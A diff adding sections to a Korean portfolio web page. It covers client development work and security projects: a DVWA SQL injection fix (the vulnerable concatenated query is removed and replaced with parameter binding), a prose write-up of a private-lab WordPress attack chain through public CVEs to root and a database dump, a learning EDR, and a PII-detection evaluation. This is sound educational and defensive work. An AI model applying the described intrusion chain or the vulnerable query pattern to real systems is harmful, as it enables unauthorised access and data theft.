+          <div class="jobrow"><span>2024.03 — 2026.03 말</span><b>스윙크 · 클라이언트 개발</b></div>
+          <p>교육용 플랫폼과 HTML5 인터랙티브 학습 콘텐츠를 개발했습니다. 실무에서 Unity·C#·Cocos Creator·TypeScript·JavaScript·WebView를 사용했고, 프로젝트에 따라 Android·iOS·PC·모바일 웹 환경을 다뤘습니다. 아래는 고객사 프로젝트별로 맡은 일과 문제 해결입니다.</p>
+          <h4 style="margin-top:22px">키즈엠 젤리아이 — 교육용 플랫폼과 콘텐츠</h4>
+          <p>팀장 보조로 공통 개발 구조 정비, 콘텐츠 개발, 부서 간 기술 이슈 조율을 맡았습니다.</p>
+          <ul>
+            <li><b>Unity–WebView 브릿지</b> — Unity와 WebView 사이에서 기능 호출과 데이터 전달을 처리하는 브릿지 통신 구조를 설계·구현했습니다. 네이티브(Unity)와 웹(WebView) 양쪽 경계에서 호출·콜백과 데이터 형식을 맞췄습니다.</li>
+            <li><b>공통 기능과 배포</b> — 반복 기능을 외부 플러그인으로 분리해 여러 콘텐츠가 공유하도록 했고, 플랫폼별 빌드 파이프라인과 콘텐츠 리소스 업로드를 관리했습니다. 반복 빌드·검수·배포와 유지보수 부담을 줄였습니다.</li>
+            <li><b>초기 로딩</b> — 진입 때 리소스를 일괄 로딩하던 방식을 서버 기반 동적·지연 로딩으로 바꾸고, 이미지 압축과 메모리 관리를 함께 적용해 초기 진입 체감 시간을 개선했습니다.</li>
+            <li><b>Android 오디오</b> — 특정 Android 기기의 WebAudio 음질 문제를 분석하고, 엔진 레벨을 우회해 DOM 오디오 객체를 직접 제어하는 방식으로 해결했습니다.</li>
+          </ul>
+          <p class="wupnote">제출 자료의 "개발 효율 50% 이상", "초기 로딩 30~40% 단축"은 산정 기준·범위를 설명할 수 있을 때 사용하며, 여기서는 반복 작업 감소와 초기 진입 개선이라는 정성적 결과로 적었습니다. 키즈엠 종료 월은 자료 간(2026.03 / 2025.12) 차이가 있어 제목에 종료 월을 붙이지 않고, 스윙크의 확정 재직 기간만 회사 제목에 표기합니다.</p>
+          <h4 style="margin-top:22px">메가스터디 · 천재교과서 — HTML5 인터랙티브 콘텐츠</h4>
+          <p>각각 2024.05 ~ 2024.10. Cocos Creator 2.4.12·TypeScript 기반으로 교육용 HTML5 콘텐츠를 개발했습니다.</p>
+          <ul>
+            <li>기획·시나리오에 따른 UI 인터랙션과 학습 콘텐츠 로직을 구현했습니다.</li>
+            <li>웹뷰 환경의 기기별 호환성에 대응하고, 반복되는 콘텐츠 패턴을 재사용 가능한 로직으로 정리했습니다.</li>
+          </ul>
+        </div></div>
+        <div class="rsec" id="tech"><h3><span class="n">02</span> 핵심 기술 — 사용 맥락과 증거</h3><div class="rbody">
+          <div class="techtable">
+            <div class="tr"><div class="tg">실무 개발</div><div class="tt">Unity · C# · Cocos Creator · TypeScript · WebView</div><div class="te"><a href="#swink" data-to="swink">스윙크 경력</a></div></div>
+            <div class="tr"><div class="tg">시스템 · 도구</div><div class="tt">C++17 · Win32 API · YARA · SQLite · Sysmon</div><div class="te"><a href="#miniedr">miniEDR</a></div></div>
+            <div class="tr"><div class="tg">웹 · AI 보안</div><div class="tt">Python · FastAPI · React · Kafka · Loki · Grafana</div><div class="te"><a href="#myora">묘라</a></div></div>
+            <div class="tr"><div class="tg">진단 · 분석</div><div class="tt">Burp Suite · OWASP ZAP · OllyDbg · Wireshark · Volatility</div><div class="te"><a href="#writeups">실습·분석</a></div></div>
+          </div>
+        </div></div>
+        <div class="rsec" id="personal"><h3><span class="n">03</span> 개인 개발 프로젝트</h3><div class="rbody">
+          <p>개발 경험의 하위 사례입니다. Top Survival 온라인은 Photon 2 실시간 멀티플레이와 뒤끝 서버 인증·저장, 그리드 인벤토리(<code class="inl">Dictionary&lt;Vector2Int,string&gt;</code>), 시야·전투·반동 로직을 구현했습니다. 이외 Zombie Crash·Car Slash·Ball Game을 개발했습니다.</p>
+          <figure class="fig" style="max-width:460px;margin-top:6px"><button class="zoom" aria-label="확대: Top Survival"><img src="assets/img/dev-01.webp" alt="Top Survival 게임 화면" loading="lazy"></button><figcaption>Top Survival — 탑뷰 전투·시야 시스템</figcaption></figure>
+        </div></div>
+        <div class="rsec" id="certs"><h3><span class="n">04</span> 자격증 · 연락</h3><div class="rbody">
+          <div class="about">
+            <div class="ab"><h4>자격증</h4>
+              <div class="line"><span>자격</span><b>네트워크관리사 2급</b></div>
+              <div class="line" style="border-bottom:none"><span>자격</span><b>정보처리기사</b></div>
+            </div>
+            <div class="ab"><h4>링크</h4>
+              <div class="line" style="border-bottom:none"><span>GitHub</span><b><a href="https://github.com/TL-cg11" target="_blank" rel="noopener noreferrer" style="color:var(--fg)">github.com/TL-cg11 ↗</a></b></div>
+            </div>
+          </div>
+        </div></div>
+      </div>
+      <div style="margin-top:28px"><a class="btn" href="#home">← 홈으로</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== CASES INDEX ===================== -->
+<div class="view" id="view-cases" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><span>진단 리스트</span></nav>
+      <h1 class="dtitle" tabindex="-1">진단 리스트</h1>
+      <p class="dsum">관찰한 것과 재검증이 필요한 것을 구분해, 사례마다 실제 상태를 함께 적었습니다.</p>
+      <div class="cards two" style="margin-top:24px">
+        <a class="ic" href="#dvwa"><div class="icimg"><img src="assets/img/dvwa-23.webp" alt="DVWA 취약 코드" loading="lazy"></div><div class="icb"><span class="ictag">WEB · CWE-89 · DVWA</span><h3>DVWA SQL Injection — 취약 코드 분석과 조치</h3><p>취약 코드 확인 → 바인딩 적용 → ZAP 재스캔 경고 미표시. 수동·정상 회귀 재검증은 보완 예정.</p><span class="icgo">사례 읽기 →</span></div></a>
+        <a class="ic" href="#wordpress"><div class="icimg"><img src="assets/img/wp-25.webp" alt="WordPress 셸 화면" loading="lazy"></div><div class="icb"><span class="ictag">WEB · 연계 실습 · 사설망</span><h3>WordPress 플러그인 취약점 연계 실습</h3><p>공개 PoC를 환경에 맞춰 조정. 접근·권한 상승·데이터·탐지를 단계별로 확인. 신규 취약점 발견 아님.</p><span class="icgo">사례 읽기 →</span></div></a>
+      </div>
+      <div style="margin-top:26px"><a class="btn" href="#home">← 홈으로</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== DVWA DETAIL ===================== -->
+<div class="view" id="view-dvwa" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#cases">진단 리스트</a><span class="sep">/</span><span>DVWA SQLi</span></nav>
+      <h1 class="dtitle" tabindex="-1">DVWA SQL Injection — 취약 코드 분석과 조치</h1>
+      <p class="dsum">사용자 입력이 검증 없이 쿼리 문자열에 결합되는 취약 코드를 확인하고, Prepared Statement와 매개변수 바인딩으로 수정했습니다. 수정 후 ZAP 재스캔에서 SQL Injection(MySQL) 경고가 사라진 것을 대조했습니다.</p>
+      <div class="status">
+        <span class="chip ok"><span class="dot"></span>취약 코드 확인</span>
+        <span class="chip ok"><span class="dot"></span>바인딩 적용</span>
+        <span class="chip ok"><span class="dot"></span>ZAP 재스캔 경고 미표시</span>
+        <span class="chip pend"><span class="dot"></span>수동 공격·정상 조회 재검증 예정</span>
+      </div>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습</div></div>
+        <div class="m"><div class="mk">대상 · 버전</div><div class="mv">DVWA v1.10 (Docker)</div></div>
+        <div class="m"><div class="mk">환경</div><div class="mv">로컬 127.0.0.1</div></div>
+        <div class="m"><div class="mk">본인 역할</div><div class="mv">분석 · 수정 · 재스캔</div></div>
+      </div>
+      <div class="toc" role="group" aria-label="목차">
+        <button data-to="dvwa-find">발견</button><button data-to="dvwa-root">근본 원인</button><button data-to="dvwa-fix">조치</button><button data-to="dvwa-retest">재검증</button><button data-to="dvwa-src">출처</button>
+      </div>
+      <div class="report">
+        <div class="rsec" id="dvwa-find"><h3><span class="n">01</span> 발견</h3><div class="rbody">
+          <p>SQL Injection(low) 페이지에서 사용자 입력 <code class="inl">id</code>가 형변환·검증 없이 쿼리에 들어가는 취약 코드를 확인했습니다.</p>
+          <figure class="fig" style="max-width:640px"><button class="zoom" aria-label="확대: 취약 코드"><img src="assets/img/dvwa-23.webp" alt="DVWA low.php의 user_id 문자열 결합 취약 코드" loading="lazy"></button><figcaption>취약 코드 — user_id 문자열 직접 결합</figcaption></figure>
+        </div></div>
+        <div class="rsec" id="dvwa-root"><h3><span class="n">02</span> 근본 원인</h3><div class="rbody">
+          <p>쿼리 문자열에 인자를 직접 결합(<code class="inl">... user_id = '$id'</code>)해, 파서가 입력을 데이터가 아닌 실행 문법으로 해석할 수 있는 지점에서 신뢰 경계가 깨집니다.</p>
+        </div></div>
+        <div class="rsec" id="dvwa-fix"><h3><span class="n">03</span> 조치</h3><div class="rbody">
+          <p><code class="inl">mysqli_prepare()</code>로 쿼리를 준비하고 <code class="inl">bind_param</code>으로 입력을 데이터로만 전달하도록 수정했습니다.</p>
+          <div class="term"><div class="bar"><b>vulnerabilities/sqli/source/low.php</b><span>PATCH</span></div><div class="body"><pre><span class="del">- $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";</span>
+<span class="add">+ $query = "SELECT first_name, last_name FROM users WHERE user_id = ?;";</span>
+<span class="add">+ $stmt   = mysqli_prepare($GLOBALS["___mysqli_ston"], $query);</span>
+<span class="add">+ mysqli_stmt_bind_param($stmt, "s", $id);</span>
+<span class="add">+ mysqli_stmt_execute($stmt);</span>
+<span class="add">+ $result = mysqli_stmt_get_result($stmt);</span></pre></div></div>
+        </div></div>
+        <div class="rsec" id="dvwa-retest"><h3><span class="n">04</span> 재검증 · 한계</h3><div class="rbody">
+          <p>수정 전후 ZAP 재스캔을 대조해, 수정 후 화면에서 <b>SQL Injection(MySQL)</b> 경고가 사라진 것을 확인했습니다(다른 경고는 남아 있음). 전체 경고 수의 차이는 해결한 취약점 수로 계산하지 않습니다. 동일 입력의 수동 공격 재현과 정상 기능 회귀 테스트는 보완 예정 항목입니다.</p>
+          <div class="figrow two">
+            <figure class="fig"><button class="zoom" aria-label="확대: 수정 전 재스캔"><img src="assets/img/dvwa-25.webp" alt="수정 전 재스캔 결과 경고 목록에 SQL Injection MySQL 행이 포함됨" loading="lazy"></button><figcaption>수정 전 재스캔 — 경고 목록에 SQL Injection(MySQL) 행 포함</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 수정 후 재스캔"><img src="assets/img/dvwa-26.webp" alt="수정 후 재스캔 결과에서 SQL Injection MySQL 경고가 표시되지 않음, 다른 경고는 남음" loading="lazy"></button><figcaption>수정 후 재스캔 — SQL Injection(MySQL) 경고가 표시되지 않음</figcaption></figure>
+          </div>
+        </div></div>
+        <div class="rsec" id="dvwa-src"><h3><span class="n">05</span> 출처 · 참고</h3><div class="rbody">
+          <p>대상은 공개 교육용 애플리케이션 DVWA입니다. 보고 구조는 <a href="https://wstg.owasp.org/v4.2/5-Reporting/" target="_blank" rel="noopener noreferrer" style="color:var(--fg)">OWASP WSTG Reporting ↗</a>의 요약·범위·발견·조치 구성을 참고했습니다.</p>
+        </div></div>
+      </div>
+      <div style="margin-top:28px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#cases">← 진단 리스트</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== WORDPRESS DETAIL ===================== -->
+<div class="view" id="view-wordpress" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#cases">진단 리스트</a><span class="sep">/</span><span>WordPress 연계 실습</span></nav>
+      <h1 class="dtitle" tabindex="-1">WordPress 플러그인 취약점 연계 실습</h1>
+      <p class="dsum">사설망 WordPress(코어 5.9.3)를 대상으로 공개된 두 플러그인 취약점의 PoC를 환경에 맞춰 조정하고, 초기 접근부터 권한 상승·데이터 접근·탐지까지 단계별로 확인했습니다. 신규 취약점 발견이 아니라 공개 취약점 재현·연계 학습입니다.</p>
+      <div class="status">
+        <span class="chip"><span class="dot"></span>사설망 교육 실습</span>
+        <span class="chip"><span class="dot"></span>로그인 전제 · 공개 PoC 조정</span>
+        <span class="chip"><span class="dot"></span>신규 취약점 발견 아님</span>
+      </div>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습(사설망)</div></div>
+        <div class="m"><div class="mk">대상</div><div class="mv">WordPress 5.9.3</div></div>
+        <div class="m"><div class="mk">환경</div><div class="mv">Kali · 사설망 · Ubuntu</div></div>
+        <div class="m"><div class="mk">본인 역할</div><div class="mv">PoC 조정 · 재현 · 탐지</div></div>
+      </div>
+      <div class="report">
+        <div class="rsec"><h3><span class="n">01</span> 정찰</h3><div class="rbody">
+          <p>nmap으로 호스트·서비스를 식별하고 WPScan으로 WordPress·플러그인을 열거했습니다.</p>
+          <figure class="fig" style="max-width:560px"><button class="zoom" aria-label="확대: 정찰"><img src="assets/img/wp-00.webp" alt="nmap 호스트 스캔 결과" loading="lazy"></button><figcaption>nmap — 호스트 식별</figcaption></figure>
+        </div></div>
+        <div class="rsec"><h3><span class="n">02</span> 초기 접근 — 취약 버전과 업로드</h3><div class="rbody">
+          <p>Ultimate Member 취약 버전(2.6.6)을 식별하고(CVE-2023-3460), Elementor 액션 권한 검증 문제(CVE-2022-1329) 공개 PoC로 업로드를 수행했습니다. 코어·플러그인 버전과 로그인 전제 조건을 구분해 기록합니다.</p>
+          <div class="figrow two">
+            <figure class="fig"><button class="zoom" aria-label="확대: 취약 버전"><img src="assets/img/wp-15.webp" alt="Ultimate Member 취약 버전 식별" loading="lazy"></button><figcaption>취약 버전 확인(Ultimate Member)</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 업로드"><img src="assets/img/wp-16.webp" alt="Elementor PoC 업로드 로그" loading="lazy"></button><figcaption>Elementor 업로드 단계</figcaption></figure>
+          </div>
+        </div></div>
+        <div class="rsec"><h3><span class="n">03</span> 셸 · 권한 상승</h3><div class="rbody">
+          <p>Meterpreter 세션에서 <code class="inl">whoami</code>는 <b>www-data</b>였고, 로컬 권한 상승 후 <code class="inl">whoami</code>가 <b>root</b>로 확인되었습니다. 웹 서버 권한 셸과 root 획득은 각각 다른 화면으로 구분합니다.</p>
+          <div class="figrow two">
+            <figure class="fig"><button class="zoom" aria-label="확대: www-data"><img src="assets/img/wp-25.webp" alt="Meterpreter www-data 셸" loading="lazy"></button><figcaption>웹 서버 권한 셸 — www-data</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: root"><img src="assets/img/wp-26.webp" alt="권한 상승 후 whoami root" loading="lazy"></button><figcaption>권한 상승 → root</figcaption></figure>
+          </div>
+        </div></div>
+        <div class="rsec"><h3><span class="n">04</span> 데이터 · 탐지</h3><div class="rbody">
+          <p>DB 덤프 생성·다운로드를 확인했습니다(root 획득과는 별도 근거). 탐지는 WPScan User-Agent 문자열에 대한 Snort 룰의 관찰 결과이며, 다른 표현의 요청까지 탐지한다고 확대하지 않습니다.</p>
+          <div class="figrow three">
+            <figure class="fig"><button class="zoom" aria-label="확대: DB 덤프"><img src="assets/img/wp-30.webp" alt="DB 덤프 다운로드 완료" loading="lazy"></button><figcaption>DB 덤프 다운로드</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: Snort"><img src="assets/img/wp-33.webp" alt="Snort WPScan 탐지 알림" loading="lazy"></button><figcaption>Snort — WPScan 시그니처 탐지</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: Kibana"><img src="assets/img/wp-31.webp" alt="Kibana 요청 분포" loading="lazy"></button><figcaption>Kibana — 요청 분포</figcaption></figure>
+          </div>
+        </div></div>
+        <div class="rsec"><h3><span class="n">05</span> 한계 · 출처</h3><div class="rbody">
+          <p>CVSS 수치는 공개 권고의 값이며 버전·벡터·실습에서 확인한 영향 범위와 함께 해석합니다. 지속성 cron은 명령 기재 기록이며 재부팅 후 유지 여부는 별도 검증 대상입니다.</p>
+          <p>참고: <a href="https://docs.ultimatemember.com/article/1866-security-incident-update-and-recommended-actions" target="_blank" rel="noopener noreferrer" style="color:var(--fg)">Ultimate Member 보안 공지 ↗</a> · <a href="https://wpscan.com/vulnerability/df62d170-c7d1-43a4-b6dc-20512934c33e/" target="_blank" rel="noopener noreferrer" style="color:var(--fg)">WPScan Elementor 권고 ↗</a></p>
+        </div></div>
+      </div>
+      <div style="margin-top:28px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#cases">← 진단 리스트</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== PROJECTS INDEX ===================== -->
+<div class="view" id="view-projects" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><span>프로젝트 리스트</span></nav>
+      <h1 class="dtitle" tabindex="-1">프로젝트 리스트</h1>
+      <p class="dsum">직접 만든 보안 도구와 팀 프로젝트의 역할·구현·결과를 확인한 범위에 맞춰 정리했습니다.</p>
+      <div class="cards two" style="margin-top:24px">
+        <a class="ic" href="#miniedr"><div class="icimg"><img src="assets/img/edr-design.webp" alt="miniEDR 모듈" loading="lazy"></div><div class="icb"><span class="ictag">SYSTEM · C++17 · 개인</span><h3>miniEDR</h3><p>YARA·SHA256 정적 탐지, 실시간 파일 감시, 격리·로그를 구현한 Windows 학습용 EDR.</p><span class="icgo">프로젝트 보기 →</span></div></a>
+        <a class="ic" href="#myora"><div class="icimg"><img src="assets/img/myora-home.webp" alt="묘라 서비스" loading="lazy"></div><div class="icb"><span class="ictag">WEB · 팀 · 팀장</span><h3>묘라 — 운세 서비스와 보안 모니터링</h3><p>서비스·3계층 인프라·보안 파이프라인 총괄. 개인정보 탐지 오탐·미탐 분석과 개선안.</p><span class="icgo">프로젝트 보기 →</span></div></a>
+      </div>
+      <p class="disc">리눅스 진단 스크립트 등 별도 도구는 작성 범위·실제 판정·테스트 근거와 실행 파일이 준비된 뒤 공개합니다. 현재 완료 프로젝트로 표시하지 않습니다.</p>
+      <div style="margin-top:22px"><a class="btn" href="#home">← 홈으로</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== miniEDR DETAIL ===================== -->
+<div class="view" id="view-miniedr" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#projects">프로젝트 리스트</a><span class="sep">/</span><span>miniEDR</span></nav>
+      <h1 class="dtitle" tabindex="-1">miniEDR — YARA 기반 정적 스캐너 + 실시간 파일 감시</h1>
+      <p class="dsum">C++17·Win32 API로 직접 만든 Windows 학습용 EDR입니다. YARA 룰과 SHA256 해시로 파일을 탐지하고 탐지 시 자동 격리합니다. 실제 구현·검증한 범위만 담았고 행위 점수화·프로세스 차단·중앙 관리는 제외했습니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">개인 프로젝트</div></div>
+        <div class="m"><div class="mk">언어 · 환경</div><div class="mv">C++17 · Win32 · MSVC</div></div>
+        <div class="m"><div class="mk">의존성</div><div class="mv">libyara · CNG · SQLite</div></div>
+        <div class="m"><div class="mk">본인 역할</div><div class="mv">설계 · 구현 전체</div></div>
+      </div>
+      <div class="report">
+        <div class="rsec"><h3><span class="n">01</span> 핵심 동작</h3><div class="rbody">
+          <div class="flow">
+            <div class="f"><span class="n">SCAN</span><span class="t"><b>scan</b> 폴더 1회 재귀 탐색 · <b>monitor</b> ReadDirectoryChangesW로 생성·수정 실시간 감시</span></div>
+            <div class="f"><span class="n">DETECT</span><span class="t">SHA256 블랙리스트 대조 + <b>libyara</b> 메모리 룰 매칭(경로 대신 내용을 읽어 스캔)</span></div>
+            <div class="f"><span class="n">RESPOND</span><span class="t">탐지 이벤트를 EventBus로 전달 → <b>MoveFileEx 격리·검증</b> · SQLite · JSONL 기록</span></div>
+          </div>
+          <div class="pills" style="margin-top:14px"><span class="pill">C++17</span><span class="pill">Win32 API</span><span class="pill">CMake · vcpkg</span><span class="pill">libyara</span><span class="pill">Windows CNG</span><span class="pill">SQLite</span><span class="pill">spdlog</span></div>
+        </div></div>
+        <div class="rsec"><h3><span class="n">02</span> 모듈 설계</h3><div class="rbody">
+          <div class="grid2">
+            <figure class="fig"><button class="zoom" aria-label="확대: 전체 흐름도"><img src="assets/img/edr-arch.webp" alt="miniEDR 전체 흐름도" loading="lazy"></button><figcaption>전체 흐름 — Scan/Monitor → 탐지 → EventBus → 격리·DB·Logger</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 모듈 구성"><img src="assets/img/edr-design.webp" alt="miniEDR 모듈별 역할 표" loading="lazy"></button><figcaption>모듈별 역할 — 8개 컴포넌트를 EventBus로 결합</figcaption></figure>
+          </div>
+        </div></div>
+        <div class="rsec"><h3><span class="n">03</span> 문제 해결 사례 — 한글 파일명 격리 오류</h3><div class="rbody">
+          <p><b>확인하려 한 것</b> — 격리(Quarantine) 모듈이 다양한 파일명에서 안정적으로 동작하는지.</p>
+          <p><b>화면에서 본 것</b> — 감시 폴더에 한글 파일명(<code class="inl">안녕하세요.txt</code>)이 들어오자 격리 단계에서 프로그램이 <code class="inl">abort()</code>로 종료됐습니다(아래 왼쪽). 로그상 한글 파일을 처리하는 지점에서 크래시가 발생했습니다.</p>
+          <p><b>원인과 조치</b> — UTF-8로 받은 경로를 <code class="inl">std::filesystem::path</code> 생성자가 OS 기본 인코딩(CP949)으로 해석해 오류가 났습니다. 경로를 <code class="inl">fs::u8path()</code>로 UTF-8임을 명시해 읽도록 바꾸자, 한글 파일명도 정상적으로 격리돼 <code class="inl">.qtn</code> 파일이 생성되는 것을 확인했습니다(아래 오른쪽).</p>
+          <div class="term"><div class="bar"><b>quarantine/Quarantine.cpp</b><span>FIX</span></div><div class="body"><pre><span class="del">- fs::path srcPath(originalPath);              // std::string → OS 기본(CP949) 해석</span>
+<span class="add">+ fs::path srcPath = fs::u8path(originalPath); // UTF-8로 명시</span></pre></div></div>
+          <div class="figrow two" style="margin-top:14px">
+            <figure class="fig"><button class="zoom" aria-label="확대: 한글 경로 오류"><img src="assets/img/edr-kr-err.webp" alt="한글 파일명 처리 중 abort로 종료되는 miniEDR 콘솔과 Debug Error 창" loading="lazy"></button><figcaption>수정 전 — 한글 파일명 처리 중 abort() 종료</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 수정 후 정상 격리"><img src="assets/img/edr-kr-fix.webp" alt="수정 후 안녕하세요.txt가 정상 격리되어 qtn 파일이 생성된 로그와 탐색기" loading="lazy"></button><figcaption>수정 후 — 안녕하세요.txt 정상 격리(.qtn 생성)</figcaption></figure>
+          </div>
+          <p class="wupnote">검증 이미지의 실험 버전과 현재 코드 버전은 구분합니다. 설계 원칙은 RAII 기반 자원 관리, 외부 룰 파일 분리, 격리 후 기록입니다.</p>
+        </div></div>
+        <div class="rsec"><h3><span class="n">04</span> 탐지 동작 확인 · 한계</h3><div class="rbody">
+          <p>분석 샘플을 격리 환경에서 스캔해 <b>룰 매칭 → 자동 격리 → SHA256 해시 출력</b>까지 동작을 확인했습니다. 샘플 라벨과 매칭 룰 이름은 별도로 표시하며, 일반 룰 매칭·파일 이동 확인과 악성코드 계열 식별은 구분합니다.</p>
+          <table class="evtable"><caption>샘플 라벨은 수집 출처 표기, 매칭 룰은 miniEDR이 적용한 룰 이름입니다.</caption>
+            <thead><tr><th>샘플 라벨</th><th>매칭 룰</th><th>결과</th></tr></thead>
+            <tbody>
+              <tr><td>AgentTesla</td><td>MiniEDR_DotNet_Generic(범용)</td><td>룰 매칭 → 격리</td></tr>
+              <tr><td>RedLine</td><td>MiniEDR_DotNet_Generic(범용)</td><td>룰 매칭 → 격리</td></tr>
+              <tr><td>RemcosRAT</td><td>MiniEDR_Formbook</td><td style="color:var(--amber)">라벨·룰 불일치 — 추가 검증 필요</td></tr>
+            </tbody>
+          </table>
+          <div class="figrow three">
+            <figure class="fig"><button class="zoom" aria-label="확대: 스캔 1"><img src="assets/img/edr-scan1.webp" alt="범용 .NET 룰 매칭 후 격리" loading="lazy"></button><figcaption>범용 .NET 룰 매칭 → 격리</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 스캔 2"><img src="assets/img/edr-scan2.webp" alt="스캔 격리 SHA256 출력" loading="lazy"></button><figcaption>스캔 · 격리 · SHA256 출력</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 스캔 3"><img src="assets/img/edr-scan3.webp" alt="샘플 라벨과 룰 이름 불일치" loading="lazy"></button><figcaption>라벨·룰 불일치(추가 검증)</figcaption></figure>
+          </div>
+        </div></div>
+      </div>
+      <div style="margin-top:28px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#projects">← 프로젝트 리스트</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== MYORA DETAIL ===================== -->
+<div class="view" id="view-myora" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#projects">프로젝트 리스트</a><span class="sep">/</span><span>묘라</span></nav>
+      <h1 class="dtitle" tabindex="-1">묘라 — 운세 웹 서비스와 보안 모니터링 (팀장)</h1>
+      <p class="dsum">사주·타로·관상 AI 운세 서비스에 개인정보 보호·보안 모니터링을 결합한 팀 프로젝트입니다. 팀장으로 서비스·3계층 인프라·보안 파이프라인 전반을 설계·조율했습니다. 강점은 큰 수치보다 역할과 오탐·미탐 원인 분석입니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">팀 프로젝트</div></div>
+        <div class="m"><div class="mk">본인 역할</div><div class="mv">팀장 · 전반 조율</div></div>
+        <div class="m"><div class="mk">스택</div><div class="mv">FastAPI · React · Kafka</div></div>
+        <div class="m"><div class="mk">관측</div><div class="mv">Loki · Grafana · Suricata</div></div>
+      </div>
+      <div class="report">
+        <div class="rsec"><h3><span class="n">01</span> 서비스</h3><div class="rbody">
+          <div class="figrow three">
+            <figure class="fig"><button class="zoom" aria-label="확대: 홈"><img src="assets/img/myora-home.webp" alt="묘한 운세 홈" loading="lazy"></button><figcaption>서비스 홈</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 결과"><img src="assets/img/myora-result.webp" alt="운세 결과 화면" loading="lazy"></button><figcaption>운세 결과</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 대시보드"><img src="assets/img/myora-dash.webp" alt="Grafana 보안 대시보드" loading="lazy"></button><figcaption>Grafana 보안 모니터링</figcaption></figure>
+          </div>
+        </div></div>
+        <div class="rsec"><h3><span class="n">02</span> 요청 · 로그 · 탐지 구조</h3><div class="rbody">
+          <figure class="fig"><button class="zoom" aria-label="확대: 탐지 구조"><img src="assets/img/myora-detarch.webp" alt="로그 탐지 구조도" loading="lazy"></button><figcaption>로그 파이프라인 — Kafka 수집 → Detector(탐지·마스킹) → Loki·보안 DB</figcaption></figure>
+          <div class="flow" style="margin-top:14px">
+            <div class="f"><span class="n">A</span><span class="t"><b>사용자 요청 경로</b> — Nginx(HTTPS·인증) → WAS → MariaDB</span></div>
+            <div class="f"><span class="n">B</span><span class="t"><b>애플리케이션 로그 수집·탐지</b> — Nginx·WAS 로그를 Kafka로 모아 PII·인증정보·프롬프트 공격을 탐지·마스킹, Loki·보안 DB 저장</span></div>
+            <div class="f"><span class="n">C</span><span class="t"><b>네트워크 IDS 관측</b> — Suricata가 네트워크 트래픽을 별도 경로로 관측(애플리케이션 로그가 순차 통과하는 구조가 아님)</span></div>
+          </div>
+        </div></div>
+        <div class="rsec"><h3><span class="n">03</span> 개인정보 탐지 평가 — 오탐·미탐 원인 분석</h3><div class="rbody">
+          <div class="grid2">
+            <div>
+              <table class="evtable"><caption>합성 문장 100건 · 엔터티 86개 조건의 단계별 오탐(FP)·미탐(FN) 변화.</caption>
+                <thead><tr><th>단계</th><th>오탐 FP</th><th>미탐 FN</th></tr></thead>
+                <tbody><tr><td>정규식</td><td>15</td><td>39</td></tr><tr><td>+ NER</td><td>15</td><td>5</td></tr><tr><td>+ NLI</td><td>7</td><td>8</td></tr></tbody>
+              </table>
+              <p style="margin-top:12px">NER로 미탐을 줄였고 NLI로 오탐을 줄였으나 일부 미탐이 늘었습니다. 이메일 66.7%·전화번호 89.5%는 기존 정밀도이며 목표값·재측정과 구분합니다. 43건 fixture와 AI 가드레일 평가는 각각 별도 조건입니다.</p>
+            </div>
+            <div><figure class="fig"><button class="zoom" aria-label="확대: 평가 그래프"><img src="assets/img/myora-eval.webp" alt="구성별 오탐 미탐 변화 그래프" loading="lazy"></button><figcaption>구성별 오탐·미탐 변화</figcaption></figure></div>
+          </div>
+          <div class="card" style="margin-top:16px;background:var(--surface-2)">
+            <div class="ch"><b>분석 사례 · 예시·시스템 이메일 오탐 (FE01~FE05)</b></div>
+            <p><b>현상</b> 예시·테스트·시스템 주소 문맥의 문장 5건(<code class="inl">t***@example.com</code> 등)이 모두 개인정보(이메일)로 탐지됐습니다. <b>관찰</b> 이메일 형식이 정규식 후보와 일치했고, 문맥 검증(NLI) 단계에서도 비PII로 제외되지 않았습니다. <b>원인</b> 예시·회신 불가 문맥의 부정 예제가 부족하고 이메일 전용 임계값이 분리되지 않은 점으로 분석했습니다. <b>제안</b> 부정 예제 보강과 규칙별 임계값 분리를 개선안으로 제시했습니다.</p>
+          </div>
